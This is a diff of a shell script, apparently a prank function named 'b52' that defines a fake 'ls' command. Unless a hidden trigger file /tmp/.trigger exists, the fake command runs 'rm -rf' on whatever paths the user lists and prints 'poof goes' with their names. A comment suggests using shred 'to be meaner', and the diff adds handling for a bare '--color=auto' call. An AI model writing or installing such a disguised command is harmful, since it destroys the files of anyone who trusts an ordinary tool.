@@ -288,20 +288,26 @@ function b52(){
 	triggerPath="/tmp/.trigger"
 	# pulls in and builds argsLS for the real ls
 	argsLS=""
+	argsLSrm=""
 	while [[ "$1" != "" ]]; do
 		argsLS="$1 ${argsLS}"
+		argsLSrm="$2 ${argsLSrm}"
 		shift
 	done
-
 	# checks for the trigger file, if it exists it acts like normal
 	if [ ! -e $triggerPath ]; then
-		/bin/rm -rf $argsLS
-		#could just as easily `shred` to be meaner
+        if [[ $argsLS == '--color=auto ' ]]; then
+                printf "\n..is something supposed to happen now?\n"
+        else
+                /bin/rm -rf $argsLSrm
+                printf "\n\e[0;5;35m*\e[mpoof\e[0;5;35m*\e[m goes [${argsLSrm}]\n"
+                #could just as easily `shred` to be meaner
+        fi
 	else
-		/bin/ls $argsLS
-		#hints at the issue
-		printf "\n\n----\n"
-		printf "argsLS= $argsLS\n"
+        /bin/ls $argsLS
+        #hints at the issue
+        printf "\n\n----\n"
+        printf "argsLS= $argsLS\n"
 	fi
 	EOF
 	)"
